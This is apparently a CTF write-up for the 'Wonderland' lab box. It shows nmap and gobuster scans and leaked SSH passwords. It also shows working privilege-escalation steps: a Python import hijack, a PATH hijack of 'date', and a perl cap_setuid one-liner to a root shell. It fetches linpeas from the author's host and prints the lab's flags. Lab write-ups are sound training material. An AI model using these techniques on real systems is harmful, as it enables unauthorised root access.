### IP
`10.10.226.175`

# Enumeration
### nmap
`nmap -sC -sV 10.10.226.175 -oN init.nmap`
```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-22 15:27 EST
Nmap scan report for 10.10.226.175
Host is up (0.14s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)
|   256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)
|_  256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Follow the white rabbit.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.37 seconds
```
* We have ssh and http

### gobuster
`gobuster dir -u http://10.10.226.175/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.226.175/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/02/22 15:50:18 Starting gobuster
===============================================================
/img (Status: 301)
/r (Status: 301)
Progress: 12164 / 220561 (5.52%)
===============================================================
2021/02/22 15:52:34 Finished
===============================================================
```

* Seeing that we have to "follow the rabbithole" on the website and the first directory is just `/r`, I guessed that I have to go to `/r/a/b/b/i/t`
	* If we look at the source of this, we find: `alice:HowDothTheLittleCrocodileImproveHisShiningTail`
	* This looks like it works as ssh credentials


# SSH
`ssh alice@10.10.226.175` with password `HowDothTheLittleCrocodileImproveHisShiningTail`


### privesc to rabbit
* Running `sudo -l` gives us the following output:
```
Matching Defaults entries for alice on wonderland:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py

```
* We can run that python file as the rabbit user
* Looking at the file, we can see that it does `import random.py` at the start
	* We can overload that import by creating our own file that does something malicious


* To get a shell, we can make a file `random.py` with the following contents:
```python
import os

os.system("/bin/sh")
```

* Running `sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py` gets us to the rabbit user

### privesc to hatter
* In the rabbit home directory, there is a binary called `teaParty`
* We don't really know what it does, so let's run it locally

* First, start a file server on the machine with `python3 -m http.server`
* Then do `wget 10.10.226.175:8000/teaParty` to get the binary locally

* Looking at the disascompilation in ghidra shows us the following for main (which was the only user-defined-function):

```c

void main(void)

{
  setuid(0x3eb);
  setgid(0x3eb);
  puts("Welcome to the tea party!\nThe Mad Hatter will be here soon.");
  system("/bin/echo -n \'Probably by \' && date --date=\'next hour\' -R");
  puts("Ask very nicely, and I will give you some tea while you wait for him");
  getchar();
  puts("Segmentation fault (core dumped)");
  return;
}

```
* The binary runs a `seuid` and `setgid`, which is practically begging us for a privesc
	* These ensure that privileges don't drop during the program
* Running `id hatter` shows us that id `1003`, (aka the `0x3eb` in the binary) is the `hatter` user
```
uid=1003(hatter) gid=1003(hatter) groups=1003(hatter)
```
* There's also a tiny bit of trickery going on, as we can see that the binary prints a segfault no matter what
	* This could have been determined by not printing errors using `./teaParty 2>/dev/null`

* The binary also runs the `date` command. Because it isn't an absolute path, we can hijack that
* Let's make our own binary that gets shell with the following in a file called "date"
```bash
#!/bin/sh
/bin/sh
```
	* nano didn't work for some reason, so I used `echo "#!/bin/sh" > date` and `echo "/bin/sh" >> date`

* Now, we can change our path variable to point to the current directory instead of /bin with `export PATH=/home/hatter:$PATH`
* Running the binary gets us the hatter user
	* Going to his home directory, we can `cat password.txt` to get `WhyIsARavenLikeAWritingDesk?`
	* This turns out to be his ssh password, which makes things easier. SSH the same way as before

### privesc to root
* Let's upload linpeas
* We can set up a file server with `python3 -m http.server 80`
	* My tun0 address is 10.6.36.105
	* Run `wget 10.6.36.105/linpeas.sh`

* Running linpeas, there's a lot of output, but we see some interesting setuid binaries:
```
Files with capabilities:
/usr/bin/perl5.26.1 = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep
```

* perl is an easy way to privesc, so we can run `./perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'`
	* [Reference](https://www.hackingarticles.in/linux-for-pentester-perl-privilege-escalation/)

* Now, running `cat /root/user.txt`, we get the user flag: `thm{"Curiouser and curiouser!"}`
* Running `cat /alice/root.txt` gets the root flag: `thm{Twinkle, twinkle, little bat! How I wonder what you’re at!}`
